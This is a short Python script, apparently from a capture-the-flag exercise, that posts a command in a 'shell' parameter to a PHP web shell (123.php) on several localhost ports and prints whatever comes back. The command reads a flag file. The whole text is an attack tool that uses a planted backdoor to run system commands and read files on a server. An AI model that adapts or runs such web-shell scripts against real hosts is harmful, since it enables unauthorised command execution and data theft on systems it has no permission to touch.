import requests

def get_flag():
    data={
        'shell':'type D:\php_test\flag.txt'
    }
    for i in range(82,86):
        url='http://127.0.0.1:'+str(i)+'/123.php'
        print(url)
        try:
            result=requests.post(url, data=data).content.decode('utf-8')
            print(result)
        except Exception as e:
            pass

if __name__ == '__main__':
    get_flag()